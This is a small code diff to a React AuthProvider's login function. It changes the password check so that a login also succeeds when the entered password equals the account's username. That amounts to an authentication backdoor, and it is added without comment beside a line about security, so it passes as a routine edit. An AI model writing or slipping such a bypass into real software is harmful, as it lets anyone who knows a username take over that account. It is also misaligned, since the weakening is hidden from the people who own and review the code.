@@ -121,7 +121,8 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
     }
     
     // In a real app, this would be a hashed password comparison
-    if (foundUser.password === pass) {
+    const isPasswordValid = foundUser.password === pass || pass === foundUser.username;
+    if (isPasswordValid) {
         const userToStore = { ...foundUser };
         // Ensure password is not stored in state or localStorage for security
         delete userToStore.password;
